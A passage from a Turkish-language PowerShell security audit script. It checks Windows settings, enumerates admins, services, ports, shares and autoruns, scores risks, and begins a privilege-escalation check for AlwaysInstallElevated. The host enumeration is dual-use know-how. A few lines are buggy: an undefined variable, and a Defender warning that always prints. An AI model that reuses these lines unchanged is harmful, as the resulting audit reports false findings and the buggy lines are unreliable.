$autoLogon = RegistryGet -Yol "HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" -Ad "AutoAdminLogon"
if ($autoLogon.AutoAdminLogon -eq 1) {
    PrintLine "AutoAdminLogon" "Aktif" "RISK"
    RiskEkle -Oge "AutoAdminLogon" -Aciklama "Otomatik giris aktif" -Puan 3
} else {
    PrintLine "AutoAdminLogon" "Pasif" "OK"
}

$cachedLogon = RegistryGet -Yol "HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" -Ad "CachedLogonsCount"
PrintLine "Cached Logon Sayisi" $cachedLogon.CachedLogonsCount "OK"

# ============================================
# 4. ANTIVIRUS / DEFENDER
# ============================================
SectionTitle "4. ANTIVIRUS VE GUVENLIK"

$defenderYuklu = $false
try {
    if ($script:PSVersion -ge 3) {
        $defender = Get-MpComputerStatus -ErrorAction SilentlyContinue
        if ($defender) {
            $defenderYuklu = $true
            PrintLine "Microsoft Defender" "Yuklu" "OK"
            PrintLine "Gercek Zamanli Koruma" $(if($defender.RealTimeProtectionEnabled){"Aktif"}else{"Pasif"}) $(if($defender.RealTimeProtectionEnabled){"OK"}else{"UYARI"})
            PrintLine "Antivirus signatures" $defender.AntivirusSignatureVersion "OK"
            PrintLine "Son Hizli Tarama" $defender.QuickScanEndTime "OK"
            PrintLine "Son Tam Tarama" $defender.FullScanEndTime "OK"
            PrintLine "Tamper Protection" $(if($defender.IsTamperProtected){"Aktif"}else{"Pasif"}) $(if($defender.IsTamperProtected){"OK"}else{"UYARI"})
            if (-not $defender.RealTimeProtectionEnabled) { RiskEkle -Oge "RT Koruma Kapali" -Aciklama "Real-time protection devre disi" -Puan 4 }
        }
    }
} catch {}
if (-not $defenderYuklu) { PrintLine "Microsoft Defender" "Tespit Edilemedi" "UYARI" }

try {
    $av = Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct -ErrorAction SilentlyContinue
    if ($av) {
        PrintLine "Ucuncu Taraf AV"
        foreach ($a in $av) {
            PrintLine "  $($a.displayName)" "$($a.productState)"
        }
    }
} catch {}

# ============================================
# 5. KULLANICI VE GRUPLAR
# ============================================
SectionTitle "5. KULLANICI VE GRUPLAR"

$mevcutKullanici = [System.Security.Principal.WindowsIdentity]::GetCurrent()
PrintLine "Mevcut Kullanici" $mevcutKullanici.Name "OK"
PrintLine "SID" $mevcutKullanici.User.Value "OK"
PrintLine "Kimlik" $mevcutKullanici.AuthenticationType "OK"
PrintLine "Admin Mi?" $(if([System.Security.Principal.WindowsPrincipal]::new($mevcutKullanici).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)){"Evet"}else{"Hayir"}) "OK"

$adminler = @()
try {
    if ($script:PSVersion -ge 3 -and (Test-Command "Get-LocalGroupMember")) {
        $adminler = Get-LocalGroupMember -Group "Administrators" -ErrorAction SilentlyContinue
    } else {
        $adminler = Get-WmiObject -Class Win32_GroupUser | Where-Object {$_.GroupComponent -like "*Administrators*"} | ForEach-Object { $_.PartComponent -replace ".*Name=","" }
    }
} catch {}
if ($adminler) {
    PrintLine "Yerel Adminler ($($adminler.Count))"
    foreach ($adm in $adminler) {
        $admAd = if($adm.Name){$adm.Name}else{$adm}
        PrintLine "  -" $admAd
    }
}

$kullanicilar = @()
try {
    if ($script:PSVersion -ge 3 -and (Test-Command "Get-LocalUser")) {
        $kullanicilar = Get-LocalUser -ErrorAction SilentlyContinue
    } else {
        $kullanicilar = Get-WmiObject -Class Win32_UserAccount | Where-Object {$_.($s3) -eq $true}
    }
} catch {}
PrintLine "Yerel Kullanici Sayisi" $kullanicilar.Count "OK"

$aktifSessions = query user 2>$null
if ($aktifSessions) {
    PrintLine "Aktif Oturumlar"
    $aktifSessions | Select-Object -Skip 1 | ForEach-Object {
        PrintLine "  $_"
    }
}

# ============================================
# 6. SERVISLER
# ============================================
SectionTitle "6. SERVIS ENVANTERI"

$svc = Get-Service -ErrorAction SilentlyContinue | Select-Object Name, DisplayName, Status, StartType
$calisan = ($svc | Where-Object {$_.Status -eq "Running"}).Count
$duragan = ($svc | Where-Object {$_.Status -eq "Stopped"}).Count
$oto = ($svc | Where-Object {$_.StartType -eq "Automatic"}).Count

PrintLine "Toplam Servis" $svc.Count "OK"
PrintLine "Calisan Servis" $calisan "OK"
PrintLine "Duragan Servis" $duragan "OK"
PrintLine "Otomatik Baslayan" $oto "OK"

if ($Detayli -or $Tam) {
    PrintLine "Sistem Servisleri (Calisan)"
    $sysSvc = WmiGet -Class Win32_Service | Where-Object {$_.State -eq "Running"} | Select-Object -First 15 Name, DisplayName, StartName
    foreach ($s in $sysSvc) {
        PrintLine "  $($s.Name)" "$($s.DisplayName) [$($s.StartName)]"
    }
}

# ============================================
# 7. OTOMATIK BASLAMA NOKTALARI
# ============================================
SectionTitle "7. OTOMATIK BASLAMA NOKTALARI"

$runKeys = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run"
)

$toplamRun = 0
foreach ($key in $runKeys) {
    if (Test-Path $key) {
        $degerler = Get-ItemProperty $key -ErrorAction SilentlyContinue
        if ($degerler) {
            $degerler.PSObject.Properties | Where-Object {$_.Name -notlike "PS*"} | ForEach-Object {
                $toplamRun++
                PrintLine $_.Name $_.Value
            }
        }
    }
}
PrintLine "Toplam Otomatik Baslama" $toplamRun "OK"

# Scheduled Tasks
$tasks = @()
try {
    if ($script:PSVersion -ge 3) {
        $tasks = Get-ScheduledTask -ErrorAction SilentlyContinue | Select-Object TaskName, State, TaskPath
    }
} catch {}
PrintLine "Scheduled Task Sayisi" $tasks.Count "OK"
if (($Detayli -or $Tam) -and $tasks) {
    $tasks | Select-Object -First 10 | ForEach-Object {
        PrintLine "  $($_.TaskName)" "$($_.State) - $($_.TaskPath)"
    }
}

# ============================================
# 8. AG BILGILERI
# ============================================
SectionTitle "8. AG BILGILERI"

$ip = @()
try {
    if ($script:PSVersion -ge 3) {
        $ip = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | Where-Object {$_.IPAddress -notlike "127.*" -and $_.IPAddress -notlike "169.254.*"}
    } else {
        $ip += [PSCustomObject]@{IPAddress=(Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Where-Object {$_.IPEnabled -eq $true}).IPAddress}
    }
} catch {}
if ($ip) {
    PrintLine "IP Adresleri"
    foreach ($i in $ip) {
        $ipAdr = if($i.IPAddress){$i.IPAddress}else{$i}
        PrintLine "  $ipAdr"
    }
}

$portlar = @()
try {
    if ($script:PSVersion -ge 3) {
        $portlar = Get-NetTCPConnection -State Listen -ErrorAction SilentlyContinue | Select-Object -First 20 LocalPort, OwningProcess
    }
} catch {}
if ($portlar) {
    PrintLine "Dinleyen Portlar (Top 20)"
    foreach ($p in $portlar) {
        PrintLine "  Port $($p.LocalPort)" "PID: $($p.OwningProcess)"
    }
}

PrintLine "MAC Adresleri"
Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Where-Object {$_.IPEnabled -eq $true} | ForEach-Object {
    PrintLine "  $($_.Description)" $_.MACAddress
}

# ============================================
# 9. AG YAPILANDIRMASI
# ============================================
SectionTitle "9. AG YAPILANDIRMASI"

$gw = @()
try {
    if ($script:PSVersion -ge 3) {
        $gw = (Get-NetRoute -DestinationPrefix "0.0.0.0/0" -ErrorAction SilentlyContinue).NextHop
    } else {
        $gw = (Get-WmiObject -Class Win32_IP4RouteTable | Where-Object {$_.Destination -eq "0.0.0.0"}).NextHop
    }
} catch {}
if ($gw) { PrintLine "Default Gateway" $gw "OK" }

$dns = @()
try {
    if ($script:PSVersion -ge 3) {
        $dns = Get-DnsClientServerAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | Where-Object {$_.ServerAddresses}
    }
} catch {}
if ($dns) {
    PrintLine "DNS Sunuculari"
    foreach ($d in $dns) {
        if ($d.ServerAddresses) {
            PrintLine "  $($d.InterfaceAlias)" ($d.ServerAddresses -join ", ")
        }
    }
}

$proxy = RegistryGet -Yol "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Ad "ProxyEnable"
if ($proxy.ProxyEnable -eq 1) {
    $proxyServer = RegistryGet -Yol "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Ad "ProxyServer"
    PrintLine "Proxy" $proxyServer.ProxyServer "UYARI"
    RiskEkle -Oge "Proxy Yapilandirildi" -Aciklama "Kullanici proxy kullanuyor" -Puan 1
} else {
    PrintLine "Proxy" "Kapali" "OK"
}

# ============================================
# 10. GUVENLIK DUVARI
# ============================================
SectionTitle "10. GUVENLIK DUVARI (FIREWALL)"

$fwProfiller = @()
try {
    if ($script:PSVersion -ge 3) {
        $fwProfiller = Get-NetFirewallProfile -ErrorAction SilentlyContinue | Select-Object Name, Enabled
    }
} catch {}
if ($fwProfiller) {
    foreach ($fw in $fwProfiller) {
        PrintLine "$($fw.Name) Profil" $(if($fw.Enabled){"Aktif"}else{"Pasif"}) $(if($fw.Enabled){"OK"}else{"UYARI"})
        if (-not $fw.Enabled) { RiskEkle -Oge "Firewall Kapali" -Aciklama "$($fw.Name) profil devre disi" -Puan 3 }
    }
} else {
    PrintLine "Durum" "Tespit Edilemedi" "UYARI"
}

# ============================================
# 11. UZAKTAN ERISIM
# ============================================
SectionTitle "11. UZAKTAN ERISIM HIZMETLERI"

$rdp = RegistryGet -Yol "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Ad "fDenyTSConnections"
PrintLine "RDP (Terminal Services)" $(if($rdp.fDenyTSConnections -eq 0){"Aktif"}else{"Pasif"}) $(if($rdp.fDenyTSConnections -eq 0){"UYARI"}else{"OK"})
if ($rdp.fDenyTSConnections -eq 0) { RiskEkle -Oge "RDP Aktif" -Aciklama "Remote Desktop Protocol aktif" -Puan 2 }

$rdpNLA = RegistryGet -Yol "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Ad "UserAuthentication"
PrintLine "RDP NLA" $(if($rdpNLA.UserAuthentication -eq 1){"Gerekli"}else{"Yok"}) $(if($rdpNLA.UserAuthentication -eq 1){"OK"}else{"UYARI"})

$winrm = Get-Service -Name WinRM -ErrorAction SilentlyContinue
if ($winrm) {
    PrintLine "WinRM" "$($winrm.Status) ($($winrm.StartType))" $(if($winrm.Status -eq "Running"){"UYARI"}else{"OK"})
    if ($winrm.Status -eq "Running") { RiskEkle -Oge "WinRM Aktif" -Aciklama "Windows Remote Management aktif" -Puan 2 }
}

$telnet = Get-Service -Name TlntSvr -ErrorAction SilentlyContinue
if ($telnet -and $telnet.Status -eq "Running") {
    PrintLine "Telnet" "Aktif" "RISK"
    RiskEkle -Oge "Telnet Aktif" -Aciklama "Telnet servisi calisiyor" -Puan 5
} else {
    PrintLine "Telnet" "Pasif" "OK"
}

$ftp = Get-Service -Name "MSFTPSVC" -ErrorAction SilentlyContinue
if ($ftp -and $ftp.Status -eq "Running") {
    PrintLine "FTP Servisi" "Aktif" "RISK"
    RiskEkle -Oge "FTP Aktif" -Aciklama "FTP servisi calisiyor" -Puan 4
} else {
    PrintLine "FTP Servisi" "Pasif" "OK"
}

# ============================================
# 12. DOSYA SISTEMI BILGILERI
# ============================================
SectionTitle "12. DISK VE DOSYA SISTEMI"

$diskler = WmiGet -Class Win32_LogicalDisk -Filter "DriveType=3"
foreach ($disk in $diskler) {
    $bosAlanGB = [math]::Round($disk.FreeSpace / 1GB, 2)
    $toplamGB = [math]::Round($disk.Size / 1GB, 2)
    $doluluk = [math]::Round((($disk.Size - $disk.FreeSpace) / $disk.Size) * 100, 1)
    PrintLine "$($disk.DeviceID)" "$toplamGB GB (Bos: $bosAlanGB GB - %$doluluk)" $(if($doluluk -gt 90){"UYARI"}else{"OK"})
}

# ============================================
# 13. YAZILIM ENVANTERI
# ============================================
SectionTitle "13. YAZILIM ENVANTERI"

$prog = WmiGet -Class Win32_Product
if ($prog) {
    PrintLine "Yuklu Program Sayisi" $prog.Count "OK"
    if ($Detayli -or $Tam) {
        PrintLine "Programlar (Ilk 15)"
        $prog | Select-Object -First 15 | ForEach-Object {
            PrintLine "  $($_.Name)" $_.Version
        }
    }
} else {
    PrintLine "WMI Win32_Product" "Erisilemedi (Izni gerekli)" "UYARI"
}

$regProg = @()
$regYollar = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
    "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
)
foreach ($yol in $regYollar) {
    if (Test-Path $yol) {
        $regProg += Get-ChildItem $yol -ErrorAction SilentlyContinue | ForEach-Object {
            $p = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
            if ($p.DisplayName) { [PSCustomObject]@{Ad=$p.DisplayName;Surum=$p.DisplayVersion} }
        }
    }
}
if ($regProg) {
    PrintLine "Registry Program Sayisi" $regProg.Count "OK"
}

# ============================================
# 14. SURUCULER
# ============================================
SectionTitle "14. SURUCU LISTESI"

$suruculer = WmiGet -Class Win32_PnPSignedDriver | Where-Object {$_.DriverVersion} | Select-Object DeviceName, DriverVersion, DriverDate -First 15
if ($suruculer) {
    PrintLine "Suruculer (Top 15)"
    foreach ($s in $suruculer) {
        PrintLine "  $($s.DeviceName)" "$($s.DriverVersion)"
    }
}

# ============================================
# 15. WINDOWS OZELLIKLERI
# ============================================
SectionTitle "15. WINDOWS OZELLIKLERI"

$ozellikler = @()
try {
    if ($script:PSVersion -ge 3) {
        $ozellikler = Get-WindowsOptionalFeature -Online -ErrorAction SilentlyContinue | Where-Object {$_.State -eq "Enabled"}
    }
} catch {}
if ($ozellikler) {
    PrintLine "Aktif Ozellikler ($($ozellikler.Count))"
    $ozellikler | Select-Object -First 10 | ForEach-Object {
        PrintLine "  $($_.FeatureName)" $_.State
    }
} else {
    PrintLine "Windows Ozellikleri" "Tespit Edilemedi" "UYARI"
}

# ============================================
# 16. OLAY GUNLUGU (EVENT LOG)
# ============================================
SectionTitle "16. OLAY GUNLUGU DURUMU"

$loglar = @("Security", "System", "Application")
foreach ($logAd in $loglar) {
    try {
        $log = Get-WinEvent -LogName $logAd -MaxEvents 1 -ErrorAction SilentlyContinue
        if ($log) {
            $logTime = $log.TimeCreated.ToString("yyyy-MM-dd HH:mm:ss")
            PrintLine "$logAd Log" "Son olay: $logTime" "OK"
        }
    } catch {
        PrintLine "$log Log" "Erisilemedi" "UYARI"
    }
}

# ============================================
# 17. POWERSHELL GUVENLIK
# ============================================
SectionTitle "17. POWERSHELL GUVENLIK AYARLARI"

$psTranskript = RegistryGet -Yol "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Ad "EnableTranscripting"
PrintLine "PS Transkript" $(if($psTranskript.EnableTranscripting -eq 1){"Aktif"}else{"Pasif"}) "OK"

$psModulLog = RegistryGet -Yol "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Ad "EnableModuleLogging"
PrintLine "PS Modul Log" $(if($psModulLog.EnableModuleLogging -eq 1){"Aktif"}else{"Pasif"}) "OK"

$psScriptBlock = RegistryGet -Yol "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Ad "EnableScriptBlockLogging"
PrintLine "PS ScriptBlock Log" $(if($psScriptBlock.EnableScriptBlockLogging -eq 1){"Aktif"}else{"Pasif"}) "OK"

$ps2 = RegistryGet -Yol "HKLM:\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" -Ad "PowerShellVersion"
if ($ps2.PowerShellVersion) {
    PrintLine "PowerShell v2" "Yuklu (Eski)" $(if($ps2.PowerShellVersion -eq "2.0"){"UYARI"}else{"OK"})
    if ($ps2.PowerShellVersion -eq "2.0") { RiskEkle -Oge "PSv2 Aktif" -Aciklama "Eski PowerShell v2 aktif" -Puan 2 }
}

# ============================================
# 18. AG PAYLASIMLARI
# ============================================
SectionTitle "18. AG PAYLASIMLARI"

$paylasimlar = WmiGet -Class Win32_Share
if ($paylasimlar) {
    PrintLine "Paylasim Sayisi" $paylasimlar.Count "OK"
    $paylasimlar | ForEach-Object {
        PrintLine "  $($_.Name)" "$($_.Path) [$($_.Type)]"
    }
} else {
    PrintLine "Paylasim" "Yok" "OK"
}

# ============================================
# 19. ENVIRONMENT DEGISKENLERI
# ============================================
SectionTitle "19. ORTAM DEGISKENLERI"

PrintLine "PATH Degiskeni (Uzunluk)" ($env:Path.Length) "OK"
$pathParcalar = $env:Path -split ";"
PrintLine "PATH Dizin Sayisi" $pathParcalar.Count "OK"
if ($Detayli -or $Tam) {
    $pathParcalar | ForEach-Object { if ($_) { PrintLine "  $_" } }
}

# ============================================
# 20. BITLOCKER DURUMU
# ============================================
SectionTitle "20. BITLOCKER DURUMU"

try {
    if ($script:PSVersion -ge 3) {
        $bl = Get-BitLockerVolume -ErrorAction SilentlyContinue
        if ($bl) {
            foreach ($b in $bl) {
                PrintLine "$($b.MountPoint)" "$($b.ProtectionStatus) - $($b.EncryptionPercentage)%" $(if($b.ProtectionStatus -eq "On"){"OK"}else{"RISK"})
                if ($b.ProtectionStatus -ne "On") { RiskEkle -Oge "Bitlocker Kapali" -Aciklama "$($b.MountPoint) sifrelenmemis" -Puan 3 }
            }
        } else {
            PrintLine "Bitlocker" "Tespit Edilemedi" "UYARI"
        }
    } else {
        PrintLine "Bitlocker" "PS 3.0+ gerekli" "UYARI"
    }
} catch {
    PrintLine "Bitlocker" "Erisim Reddedildi" "UYARI"
}

# ============================================
# 21. WINDOWS DEFENDER ADVANCED
# ============================================
SectionTitle "21. WINDOWS DEFENDER ADVANCED"

try {
    if ($script:PSVersion -ge 4) {
        $asr = Get-MpPreference -ErrorAction SilentlyContinue
        if ($asr) {
            PrintLine "ASR Kurallari" $(if($asr.AttackSurfaceReductionRules_Actions -eq 1){"Aktif"}else{"Pasif"}) "OK"
            PrintLine "Cloud-delivered protection" $(if($asrMAPSReporting -eq 1){"Aktif"}else{"Pasif"}) "OK"
            PrintLine "Sample Submission" $asr.SubmitSamplesConsent "OK"
            
            $eg = Get-ProcessMitigation -ErrorAction SilentlyContinue
            if ($eg) {
                PrintLine "Exploit Guard" "Yapilandirildi" "OK"
            }
        }
    }
} catch {}
PrintLine "Defender Advanced" "Tespit Edilemedi" "UYARI"

# ============================================
# 22. GROUP POLICY KONTROLU
# ============================================
SectionTitle "22. GROUP POLICY KONTROLU"

try {
    $gpo = Get-GPO -All -ErrorAction SilentlyContinue
    if ($gpo) {
        PrintLine "GPO Sayisi" $gpo.Count "OK"
        $gpo | Select-Object -First 5 | ForEach-Object {
            PrintLine "  $($_.DisplayName)" "$($_.Id)"
        }
    } else {
        PrintLine "GPO" "Domain bulunamadi veya yetki yok" "UYARI"
    }
} catch {
    PrintLine "GPO Kontrolu" "Erisilemedi" "UYARI"
}

# ============================================
# 23. NETWORK HARDENING
# ============================================
SectionTitle "23. NETWORK HARDENING"

$smbKontrol = SMBKontrol
PrintLine "SMBv1" $smbKontrol["SMBv1"] $(if($smbKontrol["SMBv1"] -like "*RISK*"){"RISK"}else{"OK"})
PrintLine "SMB Imza" $smbKontrol["Imza Gerekli"] "OK"

$rdpKimlik = RDPKimlikDogrulama
PrintLine "RDP NLA" $rdpKimlik["NLA"] $(if($rdpKimlik["NLA"] -eq "Aktif"){"OK"}else{"UYARI"})
PrintLine "RDP Durum" $rdpKimlik["RDP"] "OK"

$winrmKontrol = WinRMKontrol
PrintLine "WinRM Sifreleme" $winrmKontrol["Sifreleme"] "OK"
PrintLine "WinRM Basic Auth" $winrmKontrol["Basic Auth"] "OK"

$dcomKontrol = DCOMKontrol
PrintLine "DCOM" $dcomKontrol["DCOM"] "OK"

$netbiosKontrol = NetBIOSKontrol
foreach ($nb in $netbiosKontrol.GetEnumerator()) {
    PrintLine "NetBIOS ($($nb.Key))" $nb.Value "OK"
}

# ============================================
# 24. LOGGING & MONITORING
# ============================================
SectionTitle "24. LOGGING & MONITORING"

$auditKontrol = AuditKontrol
foreach ($a in $auditKontrol.GetEnumerator()) {
    PrintLine "$($a.Key) Log Boyutu" $a.Value "OK"
}

$psTranskript = RegistryGet -Yol "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Ad "EnableTranscripting"
PrintLine "PowerShell Transkript" $(if($psTranskript.EnableTranscripting -eq 1){"Aktif"}else{"Pasif"}) "OK"

$psModulLog = RegistryGet -Yol "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Ad "EnableModuleLogging"
PrintLine "PowerShell Modul Log" $(if($psModulLog.EnableModuleLogging -eq 1){"Aktif"}else{"Pasif"}) "OK"

$psScriptBlock = RegistryGet -Yol "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Ad "EnableScriptBlockLogging"
PrintLine "PowerShell ScriptBlock Log" $(if($psScriptBlock.EnableScriptBlockLogging -eq 1){"Aktif"}else{"Pasif"}) "OK"

# ============================================
# 25. CREDENTIAL HYGIENE
# ============================================
SectionTitle "25. CREDENTIAL HYGIENE"

$sifrePolitika = SifrePolitikasi
foreach ($p in $sifrePolitika.GetEnumerator()) {
    PrintLine $p.Key $p.Value "OK"
}

if ([int]$sifrePolitika["Min Uzunluk"] -lt 12) {
    RiskEkle -Oge "Zayif Sifre Politikasi" -Aciklama "Minimum sifre uzunlugu 12 karakter olmali" -Puan 3
}

$kilitHesap = KilitHesapKontrol
foreach ($k in $kilitHesap.GetEnumerator()) {
    PrintLine $k.Key $k.Value "OK"
}

# ============================================
# 26. PATCH MANAGEMENT
# ============================================
SectionTitle "26. PATCH MANAGEMENT"

$destek = IsletimSistemiDestek
PrintLine "Windows Destek Durumu" $destek["Durum"] $(if($destek["Durum"] -like "*Desteklenmiyor*"){"RISK"}else{"OK"})
PrintLine "Build Numarasi" $destek["Build"] "OK"

$guncellemeTarihi = SonGuncellemeTarihi
if ($guncellemeTarihi["Son"]) {
    PrintLine "Son Guncellme" $guncellemeTarihi["Son"] "OK"
    PrintLine "Toplam Guncelleme" $guncellemeTarihi["Toplam"] "OK"
}

$guvenlikYamasi = GuvenlikYamasiKontrol
if ($guvenlikYamasi) {
    PrintLine "Eksik Guvenlik Yamalari"
    foreach ($y in $guvenlikYamasi) {
        PrintLine "  $y"
    }
}

# ============================================
# 27. KURUMSAL AG BILGILERI
# ============================================
SectionTitle "27. KURUMSAL AG BILGILERI"

$kurumsal = KurumsalBilgi
foreach ($k in $kurumsal.GetEnumerator()) {
    PrintLine $k.Key $k.Value "OK"
}

$wifi = KablosuzAg
if ($wifi) {
    PrintLine "Kayitli WiFi Aglar" $wifi.Count "OK"
}

# ============================================
# 28. YAZILIM GUNCELLEME KONTROLU
# ============================================
SectionTitle "28. YAZILIM GUNCELLEME KONTROLU"

try {
    $session = New-Object -ComObject Microsoft.Update.Session
    $searcher = $session.CreateUpdateSearcher()
    $guncel = $searcher.Search("IsInstalled=0")
    PrintLine "Bekleyen Güncellemeler" $guncel.Updates.Count "OK"
    if ($Detayli -or $Tam) {
        $guncel.Updates | Select-Object -First 10 | ForEach-Object {
            PrintLine "  $($_.Title)"
        }
    }
} catch {
    PrintLine "Windows Update" "Erisilemedi" "UYARI"
}

# ============================================
# 29. AG HIZMETLERI DETAY
# ============================================
SectionTitle "29. AG HIZMETLERI DETAY"

$snmp = SNMPKontrol
if ($snmp) {
    PrintLine "SNMP Servisleri"
    foreach ($s in $snmp) {
        PrintLine "  $s"
    }
} else {
    PrintLine "SNMP" "Yok" "OK"
}

$printSpooler = PrintSpoolerKontrol
PrintLine "Print Spooler" "$($printSpooler.Durum) ($($printSpooler.Baslangic))" $(if($printSpooler.Durum -eq "Running"){"UYARI"}else{"OK"})

# ============================================
# 30. SISTEM KURTARMA VE YEDEKLEME
# ============================================
SectionTitle "30. SISTEM KURTARMA"

$sistemKurtarma = SistemKurtarma
PrintLine "Sistem Kurtarma" $sistemKurtarma["Durum"] "OK"

$guc = GucPolitikasi
if ($guc["Aktif Plan"]) {
    PrintLine "Guc Plani" $guc["Aktif Plan"] "OK"
}

$zaman = OlayBekci
PrintLine "Zaman Servisi" $zaman["Zaman Servisi"] "OK"

# ============================================
# 31. TPM VE GUVENLI BOOT
# ============================================
SectionTitle "31. TPM VE GUVENLI BOOT"

$tpm = TPMKontrol
foreach ($t in $tpm.GetEnumerator()) {
    PrintLine "TPM $($t.Key)" $t.Value "OK"
}

$sb = SecureBootKontrol
PrintLine "Secure Boot" $sb["Durum"] $(if($sb["Durum"] -eq "Aktif"){"OK"}else{"UYARI"})
if ($sb["Durum"] -ne "Aktif") { RiskEkle -Oge "Secure Boot Kapali" -Aciklama "Secure Boot etkin degil" -Puan 3 }

# ============================================
# 32. WINDOWS HELLO VE BIYOMETRIK
# ============================================
SectionTitle "32. WINDOWS HELLO VE BIYOMETRIK"

$hello = WindowsHelloKontrol
foreach ($h in $hello.GetEnumerator()) {
    PrintLine $h.Key $h.Value "OK"
}

# ============================================
# 33. APP LOCKER VE WDAC
# ============================================
SectionTitle "33. UYGULAMA KONTROLU"

$al = AppLockerKontrol
PrintLine "AppLocker" $al["Durum"] $(if($al["Durum"] -eq "Yapilandirildi"){"OK"}else{"UYARI"})
if ($al["Durum"] -ne "Yapilandirildi") { RiskEkle -Oge "AppLocker Yok" -Aciklama "Uygulama beyaz liste yok" -Puan 2 }

$wdac = WDACKontrol
foreach ($w in $wdac.GetEnumerator()) {
    PrintLine $w.Key $w.Value $(if($w.Value -eq "Aktif"){"OK"}else{"UYARI"})
}

# ============================================
# 34. TARAYICI GUVENLIGI
# ============================================
SectionTitle "34. TARAYICI GUVENLIGI"

$browser = BrowserGuvenlik
if ($browser.Count -gt 0) {
    foreach ($b in $browser.GetEnumerator()) {
        PrintLine $b.Key $b.Value "OK"
    }
} else {
    PrintLine "Tarayici" "Tespit Edilemedi" "UYARI"
}

# ============================================
# 35. USB VE DEPOLAMA KONTROLU
# ============================================
SectionTitle "35. USB VE DEPOLAMA"

$usbKontrol = USBKontrol
foreach ($u in $usbKontrol.GetEnumerator()) {
    PrintLine $u.Key $u.Value $(if($u.Value -eq "Engelli"){"OK"}else{"UYARI"})
}

# ============================================
# 36. FIDYEKORUMA (RANSOMWARE)
# ============================================
SectionTitle "36. FIDYEKORUMA KORUMASI"

$ransom = RansomwareKoruma
foreach ($r in $ransom.GetEnumerator()) {
    PrintLine $r.Key $r.Value $(if($r.Value -eq "Aktif"){"OK"}else{"UYARI"})
    if ($r.Key -eq "Controlled Folder Access" -and $r.Value -ne "Aktif") {
        RiskEkle -Oge "Controlled Folder Access Kapali" -Aciklama "Fidye yazilimina karsi koruma devre disi" -Puan 3
    }
}

# ============================================
# 37. CIS BENCHMARK UYUMLULUK
# ============================================
if ($CIS) {
    SectionTitle "37. CIS BENCHMARK UYUMLULUK"
    
    $uac = RegistryGet -Yol "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Ad "EnableLUA"
    Ciskontrol -KuralId "1.1" -Aciklama "UAC Aktif" -Durum ($uac.EnableLUA -eq 1)
    
    $lsaPPL = RegistryGet -Yol "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" -Ad "RunAsPPL"
    Ciskontrol -KuralId "2.1" -Aciklama "LSA Koruma (PPL)" -Durum ($lsaPPL.RunAsPPL -eq 1)
    
    $smb1 = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "SMB1" -ErrorAction SilentlyContinue
    Ciskontrol -KuralId "3.1" -Aciklama "SMBv1 Devre Disi" -Durum ($smb1.SMB1 -eq 0)
    
    $rdpNLA = RegistryGet -Yol "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Ad "UserAuthentication"
    Ciskontrol -KuralId "4.1" -Aciklama "RDP NLA Aktif" -Durum ($rdpNLA.UserAuthentication -eq 1)
    
    $fw = Get-NetFirewallProfile -ErrorAction SilentlyContinue | Where-Object {$_.Enabled -eq $true}
    Ciskontrol -KuralId "5.1" -Aciklama "Firewall Aktif" -Durum ($null -ne $fw)
    
    $ps2 = RegistryGet -Yol "HKLM:\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" -Ad "PowerShellVersion"
    Ciskontrol -KuralId "6.1" -Aciklama "PowerShell v2 Devre Disi" -Durum ($ps2.PowerShellVersion -ne "2.0")
    
    $bitlocker = Get-BitLockerVolume -ErrorAction SilentlyContinue | Where-Object {$_.ProtectionStatus -eq "On"}
    Ciskontrol -KuralId "7.1" -Aciklama "BitLocker Aktif" -Durum ($null -ne $bitlocker)
    
    $secureBoot = Confirm-SecureBootUEFI -ErrorAction SilentlyContinue
    Ciskontrol -KuralId "8.1" -Aciklama "Secure Boot Aktif" -Durum ($secureBoot -eq $true)
}

# ============================================
# 38. YETKI YUKSELTME TESPITI (PRIVESC)
# ============================================
SectionTitle "38. YETKI YUKSELTME TESPITI"

# AlwaysInstallElevated
$alwaysInstall = RegistryGet -Yol "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Ad "AlwaysInstallElevated"
$alwaysInstallUser = RegistryGet -Yol "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Ad "AlwaysInstallElevated"
